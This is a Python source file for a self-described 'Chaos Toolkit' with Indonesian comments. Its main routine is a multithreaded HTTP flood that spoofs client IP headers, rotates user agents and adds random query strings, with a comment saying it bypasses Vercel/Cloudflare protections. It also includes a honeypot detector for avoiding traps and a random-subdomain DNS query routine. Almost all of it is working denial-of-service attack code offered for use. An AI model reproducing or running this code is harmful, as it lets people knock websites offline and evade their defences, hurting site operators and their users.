import socket
import random
import threading
import time
import requests
import secrets

# * Modul Chaos Toolkit (Zaqi Nitro Boost Edition)
class SpecialTools:
    def __init__(self):
        self.isFlooding = False
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]

    # * Deteksi HoneyPot (Advanced Delay Measurement)
    def detectHoneypot(self, target):
        start = time.time()
        try:
            socket.create_connection((target, 80), timeout=2)
            delay = time.time() - start
            return delay > 1.5
        except Exception:
            return False

    # * Nitro Stress Engine (Porting from Destroyer/Agile Profile)
    def runNitroStress(self, targetUrl, duration=15, threads=50):
        self.isFlooding = True
        print(f"[*] Starting NITRO STRESS on {targetUrl} with {threads} threads.")
        
        def attack_worker():
            timeout = time.time() + duration
            session = requests.Session()
            
            while time.time() < timeout and self.isFlooding:
                if hasattr(self, 'core') and self.core and self.core.stop_requested:
                    break
                try:
                    # -- Stealth & Bypass Logic --
                    random_str = secrets.token_hex(4)
                    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                    
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'X-Forwarded-For': fake_ip,
                        'X-Real-IP': fake_ip,
                        'Cache-Control': 'no-cache',
                        'Referer': 'https://www.google.com/'
                    }
                    
                    # Target Profile logic (Bypass Vercel/Cloudflare basics)
                    connector = '&' if '?' in targetUrl else '?'
                    test_url = f"{targetUrl}{connector}nitro={random_str}"
                    
                    session.get(test_url, headers=headers, timeout=3, allow_redirects=True)
                except Exception:
                    pass
            session.close()

        # Launch Threads
        workers = []
        for _ in range(threads):
            t = threading.Thread(target=attack_worker, daemon=True)
            t.start()
            workers.append(t)
            
        return f"Nitro Stress initiated (Profile: Destroyer) for {duration} seconds."

    # * Stop all active stress tests
    def stopChaos(self):
        self.isFlooding = False
        return "Chaos activities stopped."

    # * DNS Stress Test (Safe mining)
    def dnsStressTest(self, target):
        try:
            for i in range(5):
                socket.gethostbyname(f"zaqidev{random.randint(1,999)}.{target}")
            return "DNS Queries sent (Nitro Mode)."
        except Exception as e:
            return f"DNS Error: {str(e)}"
